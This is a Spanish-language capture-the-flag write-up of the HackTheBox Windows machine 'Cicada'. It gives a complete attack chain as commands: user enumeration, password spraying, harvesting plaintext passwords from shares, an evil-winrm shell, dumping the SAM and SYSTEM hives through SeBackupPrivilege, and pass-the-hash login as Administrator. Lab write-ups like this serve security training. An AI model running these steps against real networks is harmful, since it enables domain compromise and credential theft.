+++ 
draft = false
date = 2026-01-06T00:34:02Z
title = "Cicada Machine - HackTheBox"
description = "Esta es una máquina Windows nivel fácil de la plataforma HackTheBox"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-----------------------------
- Tags: #Machine #Windows #Easy
----------------

Partimos realizando un escaneo de los puertos abiertos de la máquina víctima de la siguiente forma.

**Comando:**

```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.35 -oG allPorts
```

<img src="/images/Pasted image 20250319233239.png" style="width:100%; height:auto; display:block; margin:auto;">

Luego analizamos los puerto que fueron reportados de la siguiente forma:

**Comando:**

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,61330 -sCV 10.10.11.35
```

Dándonos como información relevante el dominio: cicada.htb y CICADA-DC.cicada.htb

añadimos cicada.htb al /etc/hosts

<img src="/images/Pasted image 20250319234500.png" style="width:100%; height:auto; display:block; margin:auto;">

Como tenemos el #Port88 (kerberos-sec) abierto, podemos realizar un ataque de fuerza bruta con kerbrute para realizar enumeración de usuarios válidos, con el siguiente comando:

*Comando:*

```bash
kerbrute_linux_amd64 userenum -d cicada.htb --dc 10.10.11.35 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Obteniendo dos usuarios válidos:
<img src="/images/Pasted image 20250320003045.png" style="width:100%; height:auto; display:block; margin:auto;">

Como tenemos usuarios podemos probarlos para ver recursos compartidos por SMB, ya que este servicio se encontraba abierto por el #Port445 (Defecto).

Primeramente analizamos usuario y contraseñas nulas de las siguiente manera:

**Comando:**

```bash
netexec smb 10.10.11.35 -u '' -p '' --shares
```

A lo cual no encontramos ninguna carpeta compartida, como enumeramos dos usuarios, probaremos con el usuario "guest" y contraseña nula de la siguiente forma:

**Comando:**

```bash
netexec smb 10.10.11.35 -u 'guest' -p '' --shares
```

Obtenemos varios recursos compartidos, de los cuales tenemos permiso de lectura para dos:

<img src="/images/Pasted image 20250320003817.png" style="width:100%; height:auto; display:block; margin:auto;">

Listaremos el recurso HR conectandonos con smbclient y el usuario guest de la siguiente forma

**Comando:**

```bash
smbclient \\\\10.10.11.35\\HR -U 'cicada.htb\guest%'
```

para descargar todos los archivos de manera recursiva y analizarlos en local podemos realizar los siguientes comandos dentro de la interfaz smb:

**Comando:**

```bash
mask ""
prompt off
recurse on
mget *
```

<img src="/images/Pasted image 20250320004828.png" style="width:100%; height:auto; display:block; margin:auto;">

Obtuvimos el archivo "'Notice from HR.txt'" el cual lo leemos y encontramos una contraseña por defecto: Cicada$M6Corpb*@Lp#nZp!8

<img src="/images/Pasted image 20250320004933.png" style="width:100%; height:auto; display:block; margin:auto;">

La almacenaremos en un archivo creado llamado pass

Como tenemos un usuario válido y su contraseña ( user: guest , pass: null) podemos seguir enumerando usuarios con el siguiente comando:

**Comando:**

```bash
impacket-lookupsid 'guest'@cicada.htb -no-pass
```
Nota: -no-pass es igual a contraseña nula

Obtenemos un output bastante grande:

<img src="/images/Pasted image 20250320005956.png" style="width:100%; height:auto; display:block; margin:auto;">

Pero a nosotros solo nos interesa los usuarios, que están justo al lado de SidTypeUser, por lo tanto filtraremos ese campo, y guardaremos los usuarios en un archivo llamado users.txt

**Comando:**

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
```

Obteniendo una lista grande de usuarios:

<img src="/images/Pasted image 20250320010228.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora con nuevos usuarios y una posible contraseña válida podemos intentar comprobar las credenciales con netexec de la siguiente forma:

**Comando:**

```bash
netexec smb 10.10.11.35 -u users.txt -p pass --continue-on-success
```

<img src="/images/Pasted image 20250320010538.png" style="width:100%; height:auto; display:block; margin:auto;">

Teniendo como resultado que el usuario michael.wrightson y la contraseña Cicada$M6Corpb*@Lp#nZp!8 son válidas, por tanto volvemos a listar los recursos compartidos con las credenciales obtenidas:

**Comando:**

```bash
netexec smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
```

obtenemos nuevos recursos pero dentro de ellos no hay nada interesante, por lo tanto enumeraremos nuevos usuarios y veremos si tienen alguna nota interesante:

**Comando:**

```bash
crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

Obteniendo una posible contraseña válida `aRt$Lp#7t*VQ!3` para el usuario david.orelious :

<img src="/images/Pasted image 20250320011522.png" style="width:100%; height:auto; display:block; margin:auto;">

Agregamos la contraseña a pass, y verificamos los recursos compartidos con las nuevas credenciales:

**Comando:**

```bash
netexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
```

<img src="/images/Pasted image 20250320014626.png" style="width:100%; height:auto; display:block; margin:auto;">

Entramos a DEV:

**Comando:**

```bash
smbclient \\\\10.10.11.35\\DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
```

Descargamos todos los archivos de forma recursiva, obteniendo un archivo Backup_script.ps1 el cual contiene una contraseña en texto plano `Q!3@Lp#M6b*7t*Vt` que será agregada a nuestro archivo pass

<img src="/images/Pasted image 20250320014929.png" style="width:100%; height:auto; display:block; margin:auto;">

Probamos la contraseña con nuestra lista de usuarios creadas

**Comando:**

```bash
netexec smb 10.10.11.35 -u users.txt -p 'Q!3@Lp#M6b*7t*Vt' --continue-on-success
```

y obtenemos unas nuevas credenciales válidas:

<img src="/images/Pasted image 20250320015305.png" style="width:100%; height:auto; display:block; margin:auto;">

El usuario: `emily.oscars`  y la contraseña: `Q!3@Lp#M6b*7t*Vt`

Ahora listaremos los recursos compartidos para las nuevas credenciales:

**Comando:**

```bash
netexec smb 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --shares
```
<img src="/images/Pasted image 20250320020023.png" style="width:100%; height:auto; display:block; margin:auto;">

Como vemos que el recurso C$ tiene permisos de lectura y escritura podemos utilizar el script evil-winrm para darnos una shell interactiva con el siguiente comando:

**Comando:**

```bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb
```

A lo cual obtenemos acceso a la máquina víctima windows, y navegando un poco en los directorios encontramos la flag de usuario, en la ruta: C:\Users\emily.oscars.CICADA\Desktop

Ahora nuestro foco es la escalada de privilegios para eso verificamos que privilegios tenemos con el usuario actual utilizando el siguiente comando:
**Comando:**

```bash
whoami /priv 
```

<img src="/images/Pasted image 20250320020752.png" style="width:100%; height:auto; display:block; margin:auto;">

Encontramos que tenemos el privilegio SeBackupPrivilege habilitado, el cual es tipico para cuentas administradoras o servicios que deban realizar backups, por lo cual puede acceder a información sensible, lo cual puede derivar a una escalada de privilegios de la siguiente manera

La  SAM (Administrador de Cuentas de Seguridad) contiene información de las cuentas de usuario locales y la pertenencia a grupos, incluyendo sus contraseñas cifradas.
La sección SYSTEM contiene la configuración general del sistema, como la clave de arranque del sistema necesaria para descifrar los hashes de contraseñas almacenados en SAM.

Con los siguientes comandos podemos copiar el sam y el system

**Comando:**

```bash
reg save hklm\sam sam
reg save hklm\system system
```

Posteriormente podemos descargar los archivos hacia nuestra máquina local

**Comando:**

```bash
download sam
download system
```

con impacket-secretsdump podemos utilizar la sam y system para dumpear los hashes ntlm de la siguiente manera:

**Comando:**

```bash
impacket-secretsdump -sam sam -system system local
```

Teniendo como resultado lo siguiente, de lo cual nos interesa la parte de `2b87e7c93a3e8a0ea4a581937016f341`:

<img src="/images/Pasted image 20250320021756.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora con evil-winrm y con el hash que obtuvimos nos podemos conectar como administrador, y así obtener de manera exitosa la escalada de privilegios

**Comando:**

```bash
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
```

y así finalmente pwneamos la máquina víctima.

<img src="/images/Pasted image 20250320022035.png" style="width:100%; height:auto; display:block; margin:auto;">
